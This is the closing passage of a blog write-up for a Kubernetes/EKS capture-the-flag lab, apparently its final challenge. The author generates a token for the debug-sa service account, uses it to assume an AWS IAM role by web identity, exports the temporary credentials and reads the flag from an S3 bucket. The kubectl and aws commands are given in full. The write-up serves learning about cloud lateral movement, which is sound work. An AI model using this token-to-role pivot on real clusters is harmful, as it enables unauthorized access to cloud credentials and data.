+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Federated&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;sts:AssumeRoleWithWebIdentity&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Condition&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;StringEquals&#34;</span>: {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&#34;</span>: <span style="color:#e6db74">&#34;sts.amazonaws.com&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Kubernetes permission</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;secrets&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;get&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;list&#34;</span>
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;serviceaccounts&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;get&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;list&#34;</span>
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;pods&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;get&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;list&#34;</span>
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;serviceaccounts/token&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;create&#34;</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Well, this last challenges give us a bunch of permissions!</p>
+<p>Let’s start from listing kubernetes resources.</p>
+<p><img alt="Resource List" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753896380128/8fe923a1-65b5-4190-a5d2-c6836741eff0.png"></p>
+<p>There is no pod and secret, only serviceaccount then what’s the point of giving us those permissions? lol</p>
+<p>Anyway, let’s see what kind of serviceaccount we have</p>
+<p><img alt="Service Accounts" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753896900774/a7017cd0-c20d-4ee4-b036-1273727719a3.png"></p>
+<p>There is 3 serviceaccount</p>
+<ol>
+<li>
+<p><code>default</code> → default serviceaccount in namespace, nothing to do with this</p>
+</li>
+<li>
+<p><code>debug-sa</code> → dummy serviceaccount, attached with some aws role</p>
+</li>
+<li>
+<p><code>s3access-sa</code> → seems serviceaccount that mentioned in challenges description. It has <code>challengeEksS3Role</code> too.</p>
+</li>
+</ol>
+<p>Let’s try generate token from <code>s3access-sa</code> serviceaccount</p>
+<p><img alt="Token forbidden" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1758036868249/c1a44623-4ebb-4dab-973a-8ca0a90f2229.png"></p>
+<p>Oops, it’s forbidden. Seems like we don’t have permissions to do that. Instead, we can generate token from <code>debug-sa</code> serviceaccount only.</p>
+<p><img alt="Debug Token" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1758036968705/788ac9fb-8cbe-4692-9f68-0d03f3633e4b.png"></p>
+<p>Well, actually we can use that <code>debug-sa</code> since we has <code>trust policy</code> to assume role we just use same method like in previous big iam challenge.</p>
+<p>So, just need to generate token from <code>debug-sa</code> but since there is <code>condition</code> check to assume role we need to add option <code>--audience “sts.amazonaws.com”</code> when generate the token.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">kubectl</span> <span style="color:#960050;background-color:#1e0010">create</span> <span style="color:#960050;background-color:#1e0010">token</span> <span style="color:#960050;background-color:#1e0010">debug-sa</span> <span style="color:#960050;background-color:#1e0010">--audience</span> <span style="color:#e6db74">&#34;sts.amazonaws.com&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">aws</span> <span style="color:#960050;background-color:#1e0010">sts</span> <span style="color:#960050;background-color:#1e0010">assume-role-with-web-identity</span> <span style="color:#960050;background-color:#1e0010">--role-session-name</span> <span style="color:#960050;background-color:#1e0010">challenge</span><span style="color:#ae81ff">5</span> <span style="color:#960050;background-color:#1e0010">--role-arn</span> <span style="color:#960050;background-color:#1e0010">arn:aws:iam::</span><span style="color:#ae81ff">688655246681</span><span style="color:#960050;background-color:#1e0010">:role/challengeEksS</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">Role</span> <span style="color:#960050;background-color:#1e0010">--web-identity-token</span> <span style="color:#960050;background-color:#1e0010">$TOKEN</span>
+</span></span></code></pre></div><p><img alt="Assume Role" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1758038779273/35aed346-004c-4b4b-82f8-e6bae4df5af0.png"></p>
+<p>We set AWS credentials we’ve got, then access the <code>flag</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">export</span> <span style="color:#960050;background-color:#1e0010">AWS_DEFAULT_REGION=&lt;region&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">export</span> <span style="color:#960050;background-color:#1e0010">AWS_ACCESS_KEY_ID=&lt;AccessKeyId&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">export</span> <span style="color:#960050;background-color:#1e0010">AWS_SECRET_ACCESS_KEY=&lt;SecretAccessKey&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">export</span> <span style="color:#960050;background-color:#1e0010">AWS_SESSION_TOKEN=&lt;Token&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">aws</span> <span style="color:#960050;background-color:#1e0010">s</span><span style="color:#ae81ff">3</span> <span style="color:#960050;background-color:#1e0010">cp</span> <span style="color:#960050;background-color:#1e0010">s</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#75715e">//challenge-flag-bucket-3ff1ae2/flag -
+</span></span></span></code></pre></div><p><img alt="S3 Flag" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1758039237117/cac2c3a6-b207-42e3-abd9-e9a71d68235b.png"></p>
+<p>That’s it! We solve all challenges!</p>
+<p>And as usual after solve all challenges we can got certificate like this</p>
+<p><img alt="Certificate" src="https://eksclustergames.com/image/ZrXKqFFO"></p>
+<p>Reference:</p>
+<ul>
+<li>
+<p><a href="https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#pivoting-to-the-cloud-environment-by-stealing-pod-identities">https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#pivoting-to-the-cloud-environment-by-stealing-pod-identities</a></p>
+</li>
+<li>
+<p><a href="https://www.wiz.io/blog/lateral-movement-risks-in-the-cloud-and-how-to-prevent-them-part-2-from-k8s-clust">https://www.wiz.io/blog/lateral-movement-risks-in-the-cloud-and-how-to-prevent-them-part-2-from-k8s-clust</a></p>
+</li>
+</ul>
+
+          </article>
+        </div>
+      </div>
+      <div class="col-sm-12 col-md-12 col-lg-3">
+        <div id="stickySideBar" class="sticky-sidebar">
+          
+          <aside class="toc">
+              <h5>
+                Table Of Contents
+              </h5>
+              <div class="toc-content">
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-secret-seeker">1. Secret Seeker</a></li>
+    <li><a href="#2-registry-hunt">2. Registry Hunt</a></li>
+    <li><a href="#3-image-inquisition">3. Image Inquisition</a></li>
+    <li><a href="#4-pod-break">4. Pod Break</a></li>
+    <li><a href="#5-container-secrets-infrastructure">5. Container Secrets Infrastructure</a></li>
+  </ul>
+</nav>
+              </div>
+          </aside>
+          
+
+          
+          <aside class="tags">
+            <h5>Tags</h5>
+            <ul class="tags-ul list-unstyled list-inline">
+              
+              
+              <li class="list-inline-item"><a href="/tags/cloud"
+                target="_blank"
+              >cloud</a></li>
+              
+              
+              <li class="list-inline-item"><a href="/tags/aws"
+                target="_blank"
+              >aws</a></li>
+              
+              
+              <li class="list-inline-item"><a href="/tags/eks"
+                target="_blank"
+              >eks</a></li>
+              
+              
+              <li class="list-inline-item"><a href="/tags/kubernetes"
+                target="_blank"
+              >kubernetes</a></li>
+              
+            </ul>
+          </aside>
+          
+
+          
+        </div>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-sm-12 col-md-12 col-lg-9 p-4">
+        
+      </div>
+    </div>
+  </div>
+  <button class="p-2 px-3" onclick="topFunction()" id="topScroll">
+    <i class="fas fa-angle-up"></i>
+  </button>
+</section>
+
+
+<div class="progress">
+  <div id="scroll-progress-bar" class="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+</div>
+<Script src="/js/scrollProgressBar.js"></script>
+
+
+<script>
+  var topScroll = document.getElementById("topScroll");
+  window.onscroll = function() {scrollFunction()};
+
+  function scrollFunction() {
+    if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+      topScroll.style.display = "block";
+    } else {
+      topScroll.style.display = "none";
+    }
+  }
+
+  function topFunction() {
+    document.body.scrollTop = 0;
+    document.documentElement.scrollTop = 0;
+  }
+
+  
+  let stickySideBarElem = document.getElementById("stickySideBar");
+  let stickyNavBar =  true ;
+  if(stickyNavBar) {
+    let headerElem = document.getElementById("profileHeader");
+    let headerHeight = headerElem.offsetHeight + 15;
+    stickySideBarElem.style.top = headerHeight + "px";
+  } else {
+    stickySideBarElem.style.top = "50px";
+  }
+</script>
+
+
+<script src="/js/readingTime.js"></script>
+
+
+
+  </div><footer>
+    
+
+
+
+  
+
+ 
+
+
+<div class="text-center pt-2">
+    
+    <span class="px-1">
+        <a href="https://github.com/afmaghribi" target="_blank" aria-label="github">
+            <svg xmlns="http://www.w3.org/2000/svg" width="2.7em" height="2.7em" viewBox="0 0 1792 1792">
+                <path id="footer-socialNetworks-github-svg-path"
+                    d="M522 1352q-8 9-20-3-13-11-4-19 8-9 20 3 12 11 4 19zm-42-61q9 12 0 19-8 6-17-7t0-18q9-7 17 6zm-61-60q-5 7-13 2-10-5-7-12 3-5 13-2 10 5 7 12zm31 34q-6 7-16-3-9-11-2-16 6-6 16 3 9 11 2 16zm129 112q-4 12-19 6-17-4-13-15t19-7q16 5 13 16zm63 5q0 11-16 11-17 2-17-11 0-11 16-11 17-2 17 11zm58-10q2 10-14 14t-18-8 14-15q16-2 18 9zm964-956v960q0 119-84.5 203.5t-203.5 84.5h-224q-16 0-24.5-1t-19.5-5-16-14.5-5-27.5v-239q0-97-52-142 57-6 102.5-18t94-39 81-66.5 53-105 20.5-150.5q0-121-79-206 37-91-8-204-28-9-81 11t-92 44l-38 24q-93-26-192-26t-192 26q-16-11-42.5-27t-83.5-38.5-86-13.5q-44 113-7 204-79 85-79 206 0 85 20.5 150t52.5 105 80.5 67 94 39 102.5 18q-40 36-49 103-21 10-45 15t-57 5-65.5-21.5-55.5-62.5q-19-32-48.5-52t-49.5-24l-20-3q-21 0-29 4.5t-5 11.5 9 14 13 12l7 5q22 10 43.5 38t31.5 51l10 23q13 38 44 61.5t67 30 69.5 7 55.5-3.5l23-4q0 38 .5 103t.5 68q0 22-11 33.5t-22 13-33 1.5h-224q-119 0-203.5-84.5t-84.5-203.5v-960q0-119 84.5-203.5t203.5-84.5h960q119 0 203.5 84.5t84.5 203.5z" />
+
+                <metadata>
+                    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+                        xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#" xmlns:dc="http://purl.org/dc/elements/1.1/">
+                        <rdf:Description about="https://iconscout.com/legal#licenses"
+                            dc:title="Github, Online, Project, Hosting, Square"
+                            dc:description="Github, Online, Project, Hosting, Square" dc:publisher="Iconscout"
+                            dc:date="2016-12-14" dc:format="image/svg+xml" dc:language="en">
+                            <dc:creator>
+                                <rdf:Bag>
+                                    <rdf:li>Font Awesome</rdf:li>
+                                </rdf:Bag>
+                            </dc:creator>
+                        </rdf:Description>
+                    </rdf:RDF>
+                </metadata>
+            </svg>
+        </a>
+    </span>
+    
+
+    
+    <span class="px-1">
+        <a href="https://linkedin.com/in/afmaghribi" target="_blank" aria-label="linkedin">
+            <svg xmlns="http://www.w3.org/2000/svg" width='2.4em' height='2.4em' fill="#fff" aria-label="LinkedIn"
+                viewBox="0 0 512 512">
+                <rect width="512" height="512" fill="#0077b5" rx="15%" />
+                <circle cx="142" cy="138" r="37" />
+                <path stroke="#fff" stroke-width="66" d="M244 194v198M142 194v198" />
+                <path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32" />
+            </svg>
+        </a>
+    </span>
+    
+
+    
+
+    
+    <a href="https://instagram.com/fauzanmaghribi" target="_blank" aria-label="instagram">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+            <radialGradient id="yOrnnhliCrdS2gy~4tD8ma" cx="19.38" cy="42.035" r="44.899"
+                gradientUnits="userSpaceOnUse">
+                <stop offset="0" stop-color="#fd5" />
+                <stop offset=".328" stop-color="#ff543f" />
+                <stop offset=".348" stop-color="#fc5245" />
+                <stop offset=".504" stop-color="#e64771" />
+                <stop offset=".643" stop-color="#d53e91" />
+                <stop offset=".761" stop-color="#cc39a4" />
+                <stop offset=".841" stop-color="#c837ab" />
+            </radialGradient>
+            <path fill="url(#yOrnnhliCrdS2gy~4tD8ma)"
+                d="M34.017,41.99l-20,0.019c-4.4,0.004-8.003-3.592-8.008-7.992l-0.019-20	c-0.004-4.4,3.592-8.003,7.992-8.008l20-0.019c4.4-0.004,8.003,3.592,8.008,7.992l0.019,20	C42.014,38.383,38.417,41.986,34.017,41.99z" />
+            <radialGradient id="yOrnnhliCrdS2gy~4tD8mb" cx="11.786" cy="5.54" r="29.813"
+                gradientTransform="matrix(1 0 0 .6663 0 1.849)" gradientUnits="userSpaceOnUse">
+                <stop offset="0" stop-color="#4168c9" />
+                <stop offset=".999" stop-color="#4168c9" stop-opacity="0" />
+            </radialGradient>
+            <path fill="url(#yOrnnhliCrdS2gy~4tD8mb)"
+                d="M34.017,41.99l-20,0.019c-4.4,0.004-8.003-3.592-8.008-7.992l-0.019-20	c-0.004-4.4,3.592-8.003,7.992-8.008l20-0.019c4.4-0.004,8.003,3.592,8.008,7.992l0.019,20	C42.014,38.383,38.417,41.986,34.017,41.99z" />
+            <path fill="#fff"
+                d="M24,31c-3.859,0-7-3.14-7-7s3.141-7,7-7s7,3.14,7,7S27.859,31,24,31z M24,19c-2.757,0-5,2.243-5,5	s2.243,5,5,5s5-2.243,5-5S26.757,19,24,19z" />
+            <circle cx="31.5" cy="16.5" r="1.5" fill="#fff" />
+            <path fill="#fff"
+                d="M30,37H18c-3.859,0-7-3.14-7-7V18c0-3.86,3.141-7,7-7h12c3.859,0,7,3.14,7,7v12	C37,33.86,33.859,37,30,37z M18,13c-2.757,0-5,2.243-5,5v12c0,2.757,2.243,5,5,5h12c2.757,0,5-2.243,5-5V18c0-2.757-2.243-5-5-5H18z" />
+        </svg>
+    </a>
+    
+
+    
+</div><div class="container py-4">
+    <div class="row justify-content-center">
+        <div class="col-md-4 text-center">
+            
+                <div class="pb-2">
+                    <a href="https://lychnobyte.my.id/" title="Ahmad Fauzzan Maghribi">
+                        <img alt="Footer logo" src="/images/logo.png"
+                            height="40px" width="40px">
+                    </a>
+                </div>
+            
+            &copy; 2026  All rights reserved
+            <div class="text-secondary">
+                Made with
+                <span class="text-danger">
+                    &#10084;
+                </span>
+                and
+                <a href="https://github.com/gurusabarish/hugo-profile" target="_blank"
+                    title="Designed and developed by gurusabarish">
+                    Hugo Profile
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+</footer><script src="/bootstrap-5/js/bootstrap.bundle.min.js"></script>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.documentElement.classList.add('dark');
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+        document.documentElement.classList.remove('dark');
+    } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.documentElement.classList.add('dark');
+        document.body.classList.add('dark');
+    }
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            document.documentElement.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            document.documentElement.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+        return new bootstrap.Tooltip(tooltipTriggerEl)
+    })
+
+</script>
+
+
+    <script>
+      
+      window.searchIndexURL = "/index.json";
+    </script>
+    <script src="/js/search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  <section id="search-content" class="py-2">
+    <div class="container" id="search-results"></div>
+  </section>
+</body>
+
+</html>
